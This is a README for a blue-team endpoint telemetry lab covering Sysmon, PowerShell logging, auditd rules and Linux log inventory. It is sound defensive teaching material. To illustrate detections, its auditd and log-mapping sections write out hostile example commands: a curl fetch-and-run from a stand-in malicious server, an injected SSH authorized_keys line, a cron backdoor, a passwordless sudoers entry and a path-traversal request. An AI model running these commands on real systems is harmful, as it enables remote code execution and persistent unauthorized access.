# 2x02 - Eyes on Endpoint

## MedDefense Health Systems

### Blue Team - Telemetry Engineering


This project focuses on endpoint observability and telemetry validation across
the hardened MedDefense environment.

Hardening reduces what an attacker can do.

Telemetry reveals what an attacker is doing.

The objective of this project is to validate that the defensive
instrumentation deployed during the previous Linux and Windows hardening
projects actually generates the evidence required by SOC analysts.

---

## Lab Environment

### Linux

```text
billing-srv-01
```

The Linux server was hardened during:

```text
2x00 - Locking the Gates
```

Security telemetry includes:

```text
auditd
meddefense.rules
auth.log
system logs
```

### Windows

```text
DC01
```

The Windows domain was hardened during:

```text
2x01 - Windows Fortress
```

Security telemetry includes:

```text
Windows Security Event Log
Advanced Audit Policy
PowerShell Logging
Sysmon
AppLocker
Windows Firewall
Active Directory
```

---

# Task 0 - Sysmon Telemetry Validation

## Script

```text
0-sysmon_validation.ps1
```

## Goal

Validate that Sysmon is correctly capturing security-relevant endpoint
activity.

Deploying Sysmon does not automatically prove that the required telemetry is
being generated.

This task performs controlled actions and verifies that each expected Sysmon
Event ID appears with sufficient detail for SOC investigation.

---

## Required Sysmon Events

The validation covers five event types:

```text
Event ID 1  - Process Creation
Event ID 3  - Network Connection
Event ID 11 - File Creation
Event ID 13 - Registry Modification
Event ID 22 - DNS Query
```

---

## Event ID 1 - Process Creation

Controlled action:

```cmd
cmd.exe /c whoami
```

The validator searches for:

```text
Image
CommandLine
```

Expected evidence:

```text
Image       = ...\cmd.exe
CommandLine = cmd.exe /c whoami
```

Expected result:

```text
Sysmon EID 1 captured, cmdline present
```

This proves that process execution telemetry contains the command-line detail
required for investigation.

---

## Event ID 3 - Network Connection

The script generates a controlled outbound TCP connection using:

```powershell
Test-NetConnection
```

Because the DC01 laboratory may not have Internet connectivity, the script
uses the Domain Controller's reachable IP address and TCP port 53.

The validator checks:

```text
DestinationIp
DestinationPort
Image
```

Expected result:

```text
Sysmon EID 3 captured, dest IP/port/process present
```

This provides network context for the process that initiated the connection.

---

## Event ID 11 - File Creation

Controlled artifact:

```text
C:\Windows\Temp\test.txt
```

The script checks:

```text
TargetFilename
Image
```

Expected result:

```text
C:\Windows\Temp\test.txt -> Sysmon EID 11 captured
```

The file is removed during cleanup.

---

## Event ID 13 - Registry Modification

Controlled Registry location:

```text
HKCU\Software\MedDefense\SysmonTest
```

Controlled value:

```text
TestValue
```

The validator checks:

```text
TargetObject
EventType
```

This proves that the telemetry records:

```text
Registry key path
value name
operation type
```

Expected result:

```text
Sysmon EID 13 captured
```

The test Registry key is removed during cleanup.

---

## Event ID 22 - DNS Query

The project requirement includes the controlled query:

```cmd
nslookup example.com
```

The validator looks for:

```text
QueryName
QueryResults
Image
```

Because DC01 may operate without Internet access, the script can also generate
a controlled query for:

```text
dc01.meddefense.local
```

The fallback allows DNS telemetry to be validated against the local
MedDefense DNS infrastructure.

Expected result:

```text
nslookup example.com -> Sysmon EID 22 captured
```

---

## Validation Method

Each test follows the same workflow:

```text
record timestamp
      ↓
perform controlled action
      ↓
wait for Sysmon
      ↓
query Sysmon Operational log
      ↓
select correct Event ID
      ↓
inspect event fields
      ↓
PASS / FAIL
```

The Sysmon log queried is:

```text
Microsoft-Windows-Sysmon/Operational
```

The validator parses the event XML instead of relying only on formatted event
messages.

This allows fields such as:

```text
CommandLine
DestinationIp
DestinationPort
TargetFilename
TargetObject
EventType
QueryName
QueryResults
```

to be validated directly.

---

## Cleanup

The script removes all temporary artifacts:

```text
C:\Windows\Temp\test.txt
HKCU\Software\MedDefense\SysmonTest
```

The script does not change:

```text
Sysmon configuration
Group Policy
Active Directory
Windows Firewall
audit policy
PowerShell policy
```

---

## Expected Output

```text
[*] Running Sysmon telemetry validation...
    [1/5] Process creation (Event ID 1)...
          cmd.exe /c whoami -> Sysmon EID 1 captured, cmdline present   [PASS]

    [2/5] Network connection (Event ID 3)...
          Outbound TCP -> Sysmon EID 3 captured, dest IP/port/process present   [PASS]

    [3/5] File creation (Event ID 11)...
          C:\Windows\Temp\test.txt -> Sysmon EID 11 captured   [PASS]

    [4/5] Registry modification (Event ID 13)...
          HKCU\...\SysmonTest -> Sysmon EID 13 captured   [PASS]

    [5/5] DNS query (Event ID 22)...
          nslookup example.com -> Sysmon EID 22 captured   [PASS]

[*] Cleanup: removing test artifacts...

Actions tested: 5 | Captured: 5 | Missed: 0
```

---

## Exit Codes

The script returns:

```text
0
```

when all five telemetry tests pass.

It returns:

```text
1
```

when one or more expected Sysmon events are missing.

---

## SOC Relevance

The five events provide different pieces of an attack timeline:

```text
Event ID 1
Process executed
      ↓
What command was run?

Event ID 3
Network connection
      ↓
Where did the process connect?

Event ID 11
File creation
      ↓
What artifact was written?

Event ID 13
Registry modification
      ↓
What system configuration changed?

Event ID 22
DNS query
      ↓
What domain did the endpoint attempt to resolve?
```

Together, these events allow an analyst to reconstruct endpoint behavior.

---

## Telemetry Engineering Lesson

Instrumentation must be tested.

The incorrect assumption is:

```text
Sysmon installed
      ↓
visibility exists
```

The correct validation model is:

```text
Sysmon installed
      ↓
controlled action
      ↓
expected event generated
      ↓
required fields present
      ↓
telemetry validated
```

The central principle of this task is:

> Deployment does not equal coverage. A telemetry source is only useful when
> the expected security events are proven to exist with enough context for
> detection and investigation.

---

# Task 1 - Sysmon ATT&CK Coverage Matrix

## Script

```text
1-sysmon_coverage_matrix.ps1
```

## Deliverable

```text
sysmon_coverage_matrix.json
```

## Goal

Measure whether the current Sysmon configuration provides sufficient
telemetry to observe attacker techniques defined in MITRE ATT&CK.

The task evaluates coverage using three dimensions:

```text
Event ID enabled
        +
filter behavior
        +
useful evidence fields
```

## Coverage States

Each ATT&CK technique is classified as:

```text
covered
partial
blind
```

### Covered

All required Event IDs are enabled and no obvious filtering conflict was
identified.

### Partial

Only part of the required telemetry exists or filtering could suppress
relevant activity.

### Blind

None of the required Event IDs are available.

## ATT&CK Mappings

The matrix includes:

```text
T1059     Command and Scripting Interpreter
T1053     Scheduled Task/Job
T1547     Boot or Logon Autostart Execution
T1055     Process Injection
T1071     Application Layer Protocol
T1574.002 DLL Side-Loading
T1027     Obfuscated or Compressed Files
```

## Sysmon Event Mapping

Important Sysmon events include:

```text
1  - ProcessCreate
3  - NetworkConnect
7  - ImageLoad
8  - CreateRemoteThread
10 - ProcessAccess
11 - FileCreate
13 - Registry value modification
15 - FileCreateStreamHash
22 - DNSQuery
```

## Filter Analysis

An enabled Event ID does not automatically guarantee visibility.

For example:

```text
NetworkConnect enabled
        ↓
onmatch="exclude"
        ↓
attacker connection matches exclusion
        ↓
event suppressed
```

The coverage matrix therefore inspects both:

```text
include rules
exclude rules
```

that may suppress relevant attacker activity.

## Evidence Fields

Coverage also depends on useful event detail.

Examples include:

```text
CommandLine
ParentImage
DestinationIp
DestinationPort
TargetFilename
TargetObject
QueryName
QueryResults
Hashes
GrantedAccess
```

These fields allow SOC analysts to investigate the context of an event.

## Real-World Example

A malicious document launches:

```text
WINWORD.EXE
      ↓
powershell.exe -enc ...
```

If Sysmon Event ID 1 is available, analysts may observe:

```text
Image
CommandLine
ParentImage
User
Hashes
```

This provides evidence for:

```text
T1059 - Command and Scripting Interpreter
```

Without ProcessCreate telemetry, the endpoint may be blind to that execution
chain.

## Detection Engineering Workflow

```text
ATT&CK behavior
      ↓
required telemetry
      ↓
Sysmon Event ID
      ↓
filter analysis
      ↓
field quality
      ↓
covered / partial / blind
      ↓
tuning recommendation
```

## Output

The script generates:

```text
sysmon_coverage_matrix.json
```

Each row contains:

```text
technique_id
technique_name
required_event_ids
enabled_event_ids
filter_conflicts
coverage_status
evidence_fields_expected
recommendation
```

Additional context includes the reason for the coverage status and a
threat example.

## SOC Lesson

Installing Sysmon does not prove that an attack technique is observable.

A mature SOC asks:

```text
What attacker behavior do we care about?
        ↓
What telemetry should record it?
        ↓
Is that telemetry enabled?
        ↓
Are filters suppressing it?
        ↓
Does the event contain enough evidence?
```

The central principle is:

> Telemetry coverage should be measured against attacker behavior rather
> than against the simple presence of a logging tool.

---

# Task 2 - PowerShell Logging Validation

## Script

```text
2-powershell_logging_validation.ps1
```

## Goal

Validate that the PowerShell logging controls deployed during Windows
hardening produce sufficient telemetry for security investigation.

The validation covers:

```text
Script Block Logging
Module Logging
Transcription
```

The objective is not simply to confirm that the settings are enabled.

The objective is to prove that real PowerShell activity produces usable
evidence.

## PowerShell Event IDs

The primary events validated are:

```text
4103 - Module Logging
4104 - Script Block Logging
```

## Test 1 - Simple Command

Controlled command:

```powershell
Get-Process
```

Expected telemetry:

```text
Event ID 4104
```

The validator checks that the command appears in the Script Block Log.

A real attacker may use commands such as:

```powershell
Get-Process
Get-Service
Get-ChildItem
```

during host discovery.

## Test 2 - Encoded PowerShell

Controlled execution:

```text
powershell.exe -enc <Base64>
```

The encoded payload contains:

```powershell
Write-Host "Test"
```

The validator checks that Event ID `4104` contains the decoded script
content rather than only the Base64 input.

This matters because attackers frequently use encoded PowerShell to make
command lines harder to read.

The telemetry chain is:

```text
powershell.exe -enc ...
        ↓
encoded command
        ↓
PowerShell decodes it
        ↓
Script Block Logging
        ↓
4104
        ↓
decoded script visible to SOC
```

## Test 3 - Module Logging

Controlled action:

```powershell
Import-Module ActiveDirectory
Get-ADDomain
```

Expected telemetry:

```text
Event ID 4103
```

Module Logging helps analysts understand which PowerShell capabilities were
used during a session.

For example, unexpected use of the ActiveDirectory module may indicate
domain reconnaissance.

## Test 4 - Multi-Line Script Block

The validator executes a controlled twelve-line script.

It verifies that Event ID `4104` contains the complete script block or enough
of the expected content to determine its detail level.

This matters because attacker scripts frequently perform several operations
within a single script block.

Partial logging can remove important context from an investigation.

## Test 5 - Transcription

PowerShell Transcription should generate text files under:

```text
C:\PSTranscripts\
```

The validator launches a controlled PowerShell session containing a unique
marker and searches newly created transcript files for that marker.

Expected result:

```text
C:\PSTranscripts\*.txt
```

with the session content recorded.

## CAPTURED and MISSED

Each telemetry test is classified based on whether the expected evidence was
observed.

```text
CAPTURED
MISSED
```

Console validation is represented as:

```text
[PASS]
[FAIL]
```

The script also identifies the level of detail:

```text
full content
partial content
```

## Real-World Example

An attacker executes:

```text
powershell.exe -enc <encoded payload>
```

A process event may reveal only:

```text
powershell.exe
-enc
Base64 data
```

Script Block Logging may reveal:

```text
Invoke-WebRequest
Invoke-Expression
credential discovery
network discovery
```

This changes the SOC analyst's question from:

```text
"PowerShell ran."
```

to:

```text
"What exactly did PowerShell do?"
```

## Detection Workflow

```text
PowerShell execution
       ↓
4104 Script Block Logging
       +
4103 Module Logging
       +
Transcription
       ↓
SIEM
       ↓
Detection
       ↓
SOC triage
       ↓
Incident investigation
```

## Safety

The validation uses only benign commands.

It does not:

```text
modify Group Policy
change PowerShell logging configuration
modify Active Directory
change security controls
download payloads
execute malware
```

## Expected Summary

```text
Tests: 5 | Captured: 5 | Missed: 0
```

If a test reports:

```text
MISSED
```

the result should be investigated as a telemetry coverage gap rather than
changed artificially to PASS.

## SOC Lesson

PowerShell being logged is not the same as PowerShell being logged well.

A useful telemetry source must answer:

```text
What command ran?
Was encoded content decoded?
Which module was used?
Was the complete script visible?
Was the session transcribed?
```

The central principle is:

> Logging configuration is only valuable when controlled testing proves that
> the evidence required for investigation is actually produced.

---

# Task 3 - Windows Telemetry Normalizer

## Script

```text
3-windows_telemetry_export.ps1
```

## Deliverable

```text
windows_events_export.json
```

## Goal

Export Windows endpoint telemetry into a normalized JSON format that can be
consumed by SOC analysts and downstream detection workflows.

The exporter reads telemetry from:

```text
Windows Security
Sysmon Operational
PowerShell Operational
```

and converts the different event formats into a common analyst-ready schema.

## Default Time Window

The default export window is:

```text
last 24 hours
```

A custom window can be specified with:

```powershell
-Hours
```

Example:

```powershell
powershell.exe -ExecutionPolicy Bypass `
    -File .\3-windows_telemetry_export.ps1 `
    -Hours 1
```

## Normalized Fields

Every event contains:

```text
timestamp
hostname
platform
source_type
channel
event_id
event_category
provider
raw_message
```

Timestamps are normalized into ISO 8601 UTC format.

Example:

```text
2026-08-08T12:45:32.1234567Z
```

## Security Event Enrichment

### Event ID 4624

Successful logon events include:

```text
target_user
logon_type
source_ip
workstation
```

### Event ID 4625

Failed logons include:

```text
target_user
failure_reason
source_ip
```

### Event ID 4672

Privileged logon events include:

```text
privileged_account
```

### Event ID 4688

Process creation includes:

```text
process_name
command_line
parent_process
```

## PowerShell Event Enrichment

### Event ID 4104

Script Block Logging includes:

```text
script_block_text
script_block_decoded
```

This allows encoded PowerShell activity to be represented using the decoded
script content generated by PowerShell logging.

## Sysmon Event Enrichment

### Sysmon Event ID 1

```text
image
command_line
parent_image
hashes
```

### Sysmon Event ID 3

```text
destination_ip
destination_port
process
```

### Sysmon Event ID 11

```text
target_filename
creating_process
```

### Sysmon Event ID 13

```text
registry_key
registry_value_name
registry_operation
```

### Sysmon Event ID 22

```text
query_name
query_results
```

## Why Normalization Matters

Raw Windows telemetry comes from different providers and uses different
field structures.

Without normalization:

```text
Security Event
Sysmon Event
PowerShell Event
      ↓
different schemas
      ↓
multiple analyst queries
```

With normalization:

```text
Security
Sysmon
PowerShell
      ↓
common fields
      ↓
single timeline
      ↓
SOC investigation
```

## Real-World Investigation Example

An intrusion may generate:

```text
4624
successful logon
      ↓
Sysmon 1
powershell.exe
      ↓
4104
decoded malicious script
      ↓
Sysmon 22
command-and-control DNS query
      ↓
Sysmon 3
outbound network connection
```

After normalization, these events can be sorted by:

```text
timestamp
```

to create a single endpoint attack timeline.

## Top Event IDs

The script reports the most frequent event types in the export.

Example:

```text
Top Event IDs:
4624
Sysmon-1
4104
4625
```

High volume does not automatically mean malicious activity.

Event frequency helps analysts understand the telemetry profile and identify
which sources dominate the dataset.

## Output Structure

The JSON contains:

```text
metadata
channel_counts
top_event_ids
events
```

Each entry under:

```text
events
```

is an independently normalized telemetry record.

## Safety

The script is read-only with respect to Windows security configuration.

It does not:

```text
modify Event Logs
change audit policy
change Sysmon
modify PowerShell logging
change Group Policy
change Active Directory
```

It only reads telemetry and creates:

```text
windows_events_export.json
```

## SOC Lesson

Collecting logs is not the same as producing usable telemetry.

Detection engineering requires:

```text
collect
   ↓
parse
   ↓
normalize
   ↓
enrich
   ↓
correlate
   ↓
detect
```

The central principle is:

> Security telemetry becomes significantly more valuable when events from
> different sources can be queried and correlated using a consistent schema.

---

# Task 4 - Windows Telemetry Quality Gate

## Script

```text
4-windows_telemetry_quality.ps1
```

## Deliverable

```text
windows_telemetry_quality.json
```

## Goal

Assess whether the normalized Windows telemetry export is sufficiently
complete, continuous and useful for SOC analyst handoff.

The script reads:

```text
windows_events_export.json
```

and evaluates several telemetry quality dimensions.

## Event Distribution

The report calculates:

```text
count per Event ID
percentage of total events
```

This identifies dominant or noisy event types.

A large number of events does not automatically indicate high telemetry
quality.

## Channel Distribution

The quality gate measures telemetry from:

```text
Security
Sysmon
PowerShell
```

The report records both event count and percentage for each source.

## Time Coverage

Telemetry is grouped by hour.

The report records:

```text
events per hour
hours with events
hours without events
```

This makes time-based visibility gaps easier to identify.

## Gap Detection

A telemetry gap is reported when:

```text
no events are observed for more than 30 minutes
```

Potential causes include:

```text
collector failure
endpoint shutdown
logging service failure
network interruption
security control failure
attacker log suppression
```

The report records:

```text
gap start
gap end
duration
largest gap
```

## Command-Line Completeness

Process telemetry is evaluated for:

```text
Security 4688
Sysmon Event ID 1
```

The quality gate checks whether:

```text
command_line
```

is populated.

Example:

```text
powershell.exe
```

without a command line provides limited context.

By contrast:

```text
powershell.exe -enc ...
```

gives analysts much stronger evidence.

## Source IP Completeness

Authentication telemetry is evaluated for:

```text
4624
4625
```

The report measures whether:

```text
source_ip
```

is populated.

Source IP information is essential for:

```text
brute-force analysis
remote access investigation
lateral movement detection
network correlation
blocking decisions
```

## Script Block Completeness

PowerShell Event ID:

```text
4104
```

is checked for:

```text
script_block_text
```

The quality gate measures how often the decoded PowerShell content is
available to analysts.

## Required Field Completeness

The report also evaluates event-specific fields for:

```text
4624
4625
4672
4688
4104
Sysmon 1
Sysmon 3
Sysmon 11
Sysmon 13
Sysmon 22
```

For every required field the report records:

```text
total events
populated fields
empty or null fields
completeness percentage
```

## Quality Score

The final quality score ranges from:

```text
0 to 100
```

The lab uses the following weighted model:

```text
25% Time coverage
20% Gap continuity
20% Command-line completeness
15% Source IP completeness
15% Script block completeness
5%  Channel presence
```

## Assessment

The score is classified as:

```text
good
acceptable
poor
```

Thresholds:

```text
85-100  good
65-84   acceptable
0-64    poor
```

## Real-World Example

A SOC may receive:

```text
500,000 Windows events
```

but discover:

```text
Command-line completeness = 20%
Source IP completeness = 40%
4104 telemetry = missing
4-hour telemetry gap
```

Despite the high event volume, the dataset is poor for investigation.

The quality gate therefore evaluates:

```text
quantity
+
continuity
+
field completeness
+
source diversity
```

rather than event volume alone.

## Noise Analysis

The report identifies whether one Event ID represents a very large percentage
of the entire dataset.

Possible classifications:

```text
balanced
moderate_concentration
high_concentration
```

High event concentration may indicate noisy telemetry that requires tuning.

## SOC Workflow

```text
Raw Windows events
      ↓
Task 3 normalization
      ↓
windows_events_export.json
      ↓
Task 4 quality gate
      ↓
good / acceptable / poor
      ↓
analyst handoff
```

## Security Engineering Lesson

A logging pipeline should not be judged only by whether events are arriving.

A mature telemetry pipeline asks:

```text
Are events continuous?
Are important fields populated?
Are all important channels present?
Are there unexplained gaps?
Is the dataset dominated by noise?
Can an analyst reconstruct attacker activity?
```

The central principle is:

> Telemetry should be measured by investigative usefulness, not simply by
> event volume.

---

# Task 5 - auditd Rule Refinement

## Goal

Refine Linux audit telemetry by adding detection-focused `auditd` rules for process execution, network activity, SSH key access, cron persistence, and sudo configuration changes.

The objective is to bring Linux endpoint visibility closer to the telemetry provided by Sysmon on Windows.

## Script

```text
5-auditd_refine.sh
```

## Environment

The task is executed on the Ubuntu Linux endpoint used as the MedDefense Linux telemetry host.

Required components:

```text
auditd
auditctl
ausearch
augenrules
```

The lab host runs Ubuntu 26.04. The previous `2x00` auditd hardening script was designed for Ubuntu 22.04 and correctly refused automatic remediation on the newer operating system.

Therefore, the telemetry refinement rules are deployed and validated directly by this task.

## Detection Rules

### 1. Process Execution

Audit key:

```text
process_exec
```

Rule:

```text
-a always,exit -F arch=b64 -S execve -k process_exec
```

This monitors the `execve` system call used when programs are executed.

It provides Linux process execution visibility similar to Sysmon Event ID 1 on Windows.

Example attacker activity:

```bash
curl http://malicious-server/payload
chmod +x payload
./payload
```

Process execution telemetry helps analysts identify which commands and binaries were executed on the endpoint.

---

### 2. Network Socket and Connection Activity

Audit key:

```text
network_connect
```

Rule:

```text
-a always,exit -F arch=b64 -S socket -S connect -k network_connect
```

This monitors processes creating network sockets and initiating connections.

Example attacker activity:

```text
malware
   |
   +-- socket()
   |
   +-- connect()
   |
   +--> Command-and-Control server
```

This telemetry can help identify unexpected outbound communication or command-and-control activity.

---

### 3. SSH Key Monitoring

Audit key:

```text
ssh_keys
```

Required monitoring pattern:

```text
-w /home/*/.ssh/ -p rwa -k ssh_keys
```

Because auditd watch rules do not use shell wildcard expansion for paths, the implementation creates explicit rules for existing user `.ssh` directories.

Example persistence technique:

```bash
echo "ssh-ed25519 AAAA..." >> ~/.ssh/authorized_keys
```

An attacker who adds their public key to `authorized_keys` may retain SSH access even after the user's password is changed.

Monitoring SSH key directories therefore provides important persistence telemetry.

---

### 4. Cron Persistence Monitoring

Audit key:

```text
cron_persist
```

Rules:

```text
-w /etc/cron.d/ -p wa -k cron_persist
-w /var/spool/cron/ -p wa -k cron_persist
```

Cron jobs can be abused to execute malicious commands automatically.

Example:

```bash
echo "* * * * * /tmp/backdoor" > /etc/cron.d/update
```

Monitoring cron directories helps detect persistence mechanisms based on scheduled execution.

---

### 5. sudo Configuration Monitoring

Audit key:

```text
sudoers
```

Rule:

```text
-w /etc/sudoers.d/ -p wa -k sudoers
```

Changes to sudo configuration can provide persistent privilege escalation.

Example:

```text
attacker ALL=(ALL) NOPASSWD:ALL
```

A malicious entry like this could allow an attacker to execute commands as root without providing a password.

Monitoring `/etc/sudoers.d/` therefore provides visibility into potentially dangerous privilege changes.

## Loading the Rules

Persistent audit rules are stored under:

```text
/etc/audit/rules.d/
```

The updated configuration is loaded using:

```bash
sudo augenrules --load
```

Active rules can be inspected with:

```bash
sudo auditctl -l
```

## Validation

The script does not assume that successfully loading a rule means that useful telemetry is being generated.

Each new rule is tested with a controlled action and verified using `ausearch`.

### Process Execution

Trigger:

```bash
/usr/bin/id
```

Validation:

```bash
sudo ausearch -k process_exec
```

Expected result:

```text
CAPTURED
```

### Network Connection

Trigger:

```bash
curl localhost
```

Validation:

```bash
sudo ausearch -k network_connect
```

Expected result:

```text
CAPTURED
```

### SSH Key Access

Controlled activity is generated inside an existing `.ssh` directory.

Validation:

```bash
sudo ausearch -k ssh_keys
```

Expected result:

```text
CAPTURED
```

### Cron Persistence

A temporary file is created under:

```text
/etc/cron.d/
```

Validation:

```bash
sudo ausearch -k cron_persist
```

Expected result:

```text
CAPTURED
```

### sudoers Monitoring

A temporary file is created under:

```text
/etc/sudoers.d/
```

Validation:

```bash
sudo ausearch -k sudoers
```

Expected result:

```text
CAPTURED
```

Controlled test artifacts are removed after validation.

## Expected Result

A successful validation should produce:

```text
[*] Adding detection-focused rules...
    execve syscall tracking                   [ADDED]
    socket/connect syscall tracking           [ADDED]
    SSH key file monitoring                   [ADDED]
    Cron directory monitoring                 [ADDED]
    sudoers.d monitoring                      [ADDED]

[*] Loading rules...
    augenrules --load: OK

[*] Validating new rules...
    execve: ran /usr/bin/id                    [CAPTURED]
    socket: curl localhost                     [CAPTURED]
    ssh_keys: SSH key test                     [CAPTURED]
    cron: cron persistence test                [CAPTURED]
    sudoers: sudo configuration test           [CAPTURED]

Rules added: 5 | Validation: 5/5 PASS
```

## Real-World Security Value

The rules provide visibility across several important stages of an attack:

```text
Attacker executes payload
        |
        v
process_exec
        |
        +----> opens network connection
        |          |
        |          v
        |     network_connect
        |
        +----> installs SSH key
        |          |
        |          v
        |       ssh_keys
        |
        +----> creates cron persistence
        |          |
        |          v
        |     cron_persist
        |
        +----> modifies sudo configuration
                   |
                   v
                sudoers
```

Together, these events allow SOC analysts to reconstruct attacker activity instead of relying only on authentication or application logs.

## Windows and Linux Telemetry Comparison

The project now provides complementary endpoint telemetry:

| Security Activity | Windows | Linux |
|---|---|---|
| Process execution | Sysmon Event ID 1 | auditd `execve` |
| Network activity | Sysmon Event ID 3 | auditd `socket/connect` |
| Persistence | Sysmon registry/file events | cron and SSH watches |
| Privilege changes | Windows Security logs | sudoers monitoring |
| Investigation | Event Viewer / SIEM | `ausearch` / SIEM |

## Security Engineering Lesson

Installing a logging system does not guarantee detection coverage.

A telemetry control should be validated using the complete cycle:

```text
Define threat
      |
      v
Create telemetry rule
      |
      v
Load rule
      |
      v
Generate controlled activity
      |
      v
Search generated telemetry
      |
      v
Confirm evidence exists
```

This is the same principle used earlier with Sysmon: **deployment does not equal coverage**.

The purpose of telemetry engineering is not simply to collect logs, but to ensure that the logs contain enough evidence for analysts to understand what an attacker actually did.

---

# Task 6 - Linux Log Source Mapping

## Script

```text
6-log_source_map.sh
```

## Goal

Inventory the active Linux log sources available on the hardened endpoint and document their format, location, rotation policy, event rate, and security relevance.

The purpose of this task is to understand exactly what telemetry exists before attempting to normalize and export it for SOC consumption.

## Why This Matters

Linux telemetry is distributed across multiple files and services.

Different sources answer different security questions:

```text
auth.log
Who authenticated?
Who used sudo?
Were there failed SSH logins?

audit.log
What process executed?
What file changed?
What syscall was used?

syslog
What happened to services and the operating system?

kern.log
What happened at kernel level?

apache2/access.log
What HTTP requests reached the server?

apache2/error.log
What web server errors or suspicious conditions occurred?

dpkg.log
What software was installed, upgraded or removed?
```

A SOC cannot build reliable detection rules without first understanding which of these sources actually exist and generate telemetry.

## Expected Log Sources

The inventory checks:

```text
/var/log/auth.log
/var/log/audit/audit.log
/var/log/syslog
/var/log/kern.log
/var/log/dpkg.log
/var/log/apache2/access.log
/var/log/apache2/error.log
```

The script also discovers additional security-relevant sources when present, such as:

```text
/var/log/fail2ban.log
/var/log/ufw.log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

## Log Formats

Each source is classified using a format type.

Supported classifications include:

```text
syslog
JSON
audit
custom
```

Examples:

```text
auth.log     -> syslog
syslog       -> syslog
audit.log    -> audit
dpkg.log     -> custom
Apache logs  -> custom
```

## Rotation Policy

The script searches:

```text
/etc/logrotate.d/
```

to identify the rotation policy associated with each log source.

Typical settings may include:

```text
daily
weekly
monthly
rotate 7
rotate 14
rotate 30
```

Example:

```text
daily, rotate 14
```

means that logs are rotated daily and approximately fourteen rotated copies are retained.

## Current File Size

The current size of each log source is collected using Linux filesystem utilities.

Example:

```text
auth.log       2.4M
audit.log      18M
syslog         6.1M
```

File size can help identify unusually high or unusually low telemetry volume.

## Events Per Hour

The script calculates an estimated:

```text
events per hour
```

for each active log source.

Example:

```text
audit.log      187 events/hr
auth.log        42 events/hr
apache access  234 events/hr
dpkg.log        <1 event/hr
```

This provides a basic understanding of telemetry volume.

High volume does not automatically mean high security value.

For example:

```text
Apache access log
500 events/hour

auth.log
5 events/hour
```

The five authentication events may still be more important to a SOC investigation than hundreds of normal HTTP requests.

## Security Relevance

Every log source receives a security relevance rating:

```text
critical
high
medium
low
```

Example classifications:

```text
audit.log        critical
auth.log         critical
syslog           high
Apache access    high
Apache error     high
kern.log         medium
dpkg.log         medium
```

The rating represents investigative usefulness rather than event volume.

## Missing Sources

The script explicitly identifies expected log sources that do not exist.

Example:

```text
[MISSING] auth.log -> /var/log/auth.log
```

A missing file does not always mean that Linux is not generating the telemetry.

Modern Linux systems may use:

```text
systemd-journald
```

instead of traditional text log files.

For example:

```text
/var/log/syslog missing
        |
        v
journalctl contains events
```

This distinction is important because a SIEM agent configured only to ingest `/var/log/syslog` could become blind even though the operating system is still logging events elsewhere.

## Inactive Sources

A log source may exist but contain no current telemetry.

The script reports this as:

```text
[INACTIVE]
```

Example:

```text
apache2/access.log exists
but contains no events
```

Possible explanations include:

```text
service not running
service unused
logging disabled
wrong log path
collector problem
```

## Real-World Example

Consider an attacker who compromises the Linux server through a web application.

The activity might appear across several sources:

```text
apache2/access.log
        |
        | suspicious HTTP request
        v
apache2/error.log
        |
        | application error
        v
audit.log
        |
        | command execution
        v
auth.log
        |
        | sudo activity
        v
syslog
        |
        | service restart
        v
SOC investigation
```

No single log source provides the full attack story.

The analyst must correlate multiple sources.

## Example Authentication Investigation

A brute-force attack may produce:

```text
auth.log

Failed password
Failed password
Failed password
Failed password
Accepted password
```

This allows analysts to identify:

```text
source IP
target account
failed attempts
successful authentication
```

## Example Package Investigation

If an attacker installs a tool using the package manager:

```bash
sudo apt install netcat-openbsd
```

`dpkg.log` may provide evidence that a package was installed.

This can be useful when answering:

```text
Was new software installed?
When was it installed?
Was it installed during the incident window?
```

## Example Web Investigation

Apache access logs may show:

```text
GET /login.php
GET /admin
POST /upload.php
GET /../../etc/passwd
```

The log can help identify:

```text
scanning
directory traversal
authentication attacks
web exploitation
```

Apache error logs may provide additional context about failed requests or application errors.

## auditd Relationship

Task 5 improved `auditd` visibility with keys such as:

```text
process_exec
network_connect
ssh_keys
cron_persist
sudoers
```

Task 6 now inventories:

```text
/var/log/audit/audit.log
```

as one of the critical Linux telemetry sources.

The relationship is:

```text
Task 5
Create useful audit telemetry
        |
        v
audit.log
        |
        v
Task 6
Inventory and characterize the source
        |
        v
future normalization/export
```

## Validation

Run:

```bash
bash -n 6-log_source_map.sh
```

Then:

```bash
shellcheck 6-log_source_map.sh
```

Execute:

```bash
sudo ./6-log_source_map.sh
```

Expected structure:

```text
[*] Discovering log sources...

Source             Path                       Format    Rotation       Events/hr   Relevance
------             ----                       ------    --------       ---------   ---------
auth.log           /var/log/auth.log          syslog    ...            ...         critical
audit.log          /var/log/audit/audit.log   audit     ...            ...         critical
syslog             /var/log/syslog            syslog    ...            ...         high
kern.log           /var/log/kern.log          syslog    ...            ...         medium
apache2 access     /var/log/apache2/access.log custom   ...            ...         high
apache2 error      /var/log/apache2/error.log  custom   ...            ...         high
dpkg.log           /var/log/dpkg.log          custom    ...            ...         medium

Sources found: X | Missing: Y
```

The actual counts depend on the Linux host.

## SOC Workflow

This task establishes the source inventory for later telemetry engineering:

```text
Linux services
      |
      v
log files / journald / auditd
      |
      v
Task 6 source inventory
      |
      v
known paths
known formats
known volumes
known rotation
known relevance
      |
      v
normalization
      |
      v
SIEM ingestion
      |
      v
SOC detection
```

## Security Engineering Lesson

Before collecting logs, a security engineer should know:

```text
What sources exist?
Where are they stored?
What format do they use?
How long are they retained?
How much telemetry do they generate?
Are important sources missing?
How useful are they for investigation?
```

The central principle is:

> A telemetry pipeline should begin with an accurate inventory of the available evidence sources, not with assumptions about what the operating system is logging.

---

## Task 7 - Linux Event Export

### Goal

Export security-relevant Linux telemetry from multiple log sources into a structured and normalized JSON format that can be consumed by SOC analysts and queried with tools such as `jq`.

The script provides the Linux equivalent of the Windows telemetry export created in Task 3.

### Script

`7-linux_export.sh`

### Output

`linux_events_export.json`

### Log Sources

The script reads telemetry from the following Linux log sources:

- `/var/log/auth.log`
- `/var/log/audit/audit.log`
- `/var/log/syslog`

### auth.log Telemetry

The script parses authentication-related activity including:

- Successful SSH logins
- Failed SSH logins
- SSH username
- SSH source IP address
- `sudo` activity
- User executing `sudo`
- Commands executed through `sudo`
- `su` activity
- PAM authentication events

These events are useful for detecting suspicious authentication attempts, brute-force activity, privilege escalation, and unauthorized administrative activity.

### auditd Telemetry

The script parses auditd syscall-level telemetry including:

- Process execution using `execve`
- Executable path
- Command line
- File access
- File path
- Network socket creation and connection activity
- Audit rule keys

This provides process-level visibility similar to the process telemetry generated by Sysmon on Windows.

